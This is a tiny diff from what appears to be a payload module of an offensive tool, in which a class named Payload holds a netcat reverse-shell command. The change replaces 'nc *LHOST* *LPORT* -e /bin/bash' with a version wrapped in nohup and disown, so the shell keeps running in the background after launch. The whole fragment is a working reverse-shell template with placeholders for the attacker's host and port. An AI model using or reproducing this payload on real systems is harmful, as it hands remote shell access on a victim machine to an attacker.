@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = "nc *LHOST* *LPORT* -e /bin/bash"
+    data = "nohup nc *LHOST* *LPORT* -e /bin/bash & disown"
